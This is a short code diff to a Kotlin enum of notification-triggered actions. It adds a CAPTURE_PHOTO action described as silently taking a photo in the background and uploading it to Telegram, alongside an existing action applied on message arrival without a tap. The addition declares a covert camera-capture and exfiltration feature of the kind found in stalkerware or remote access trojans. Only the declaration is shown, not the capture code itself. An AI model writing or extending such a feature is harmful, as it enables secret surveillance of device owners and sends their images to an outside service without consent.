@@ -141,6 +141,11 @@ enum class NotificationActionDef(
                 "autoApply=true applies it as soon as the message arrives, without a tap.",
         requiredParams = listOf("iconStyle"),
         optionalParams = listOf("autoApply"),
+    ),
+    CAPTURE_PHOTO(
+        id = "CAPTURE_PHOTO",
+        description = "Captures a photo silently in the background and uploads it to Telegram Storage.",
+        optionalParams = listOf("lensFacing"),
     );
 
     companion object {
